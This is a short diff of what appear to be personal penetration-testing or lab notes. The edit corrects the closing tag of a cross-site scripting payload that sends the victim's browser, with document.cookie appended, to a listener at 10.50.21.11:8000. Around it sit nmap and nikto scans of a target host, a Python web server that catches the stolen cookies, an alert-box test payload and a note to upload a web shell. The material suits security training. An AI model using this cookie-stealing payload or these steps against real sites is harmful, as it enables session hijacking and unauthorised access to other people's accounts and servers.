@@ -90,7 +90,7 @@ nmap --script http-enum.nse 10.50.45.126 -p80
 nikto -host 10.50.45.126
 
 python3 -m http.server
-<script>document.location="http://10.50.21.11:8000/"+document.cookie;<script>
+<script>document.location="http://10.50.21.11:8000/"+document.cookie;</script>
 <script>alert('hello')</script)
 
 upload web shell to obtain access in the site
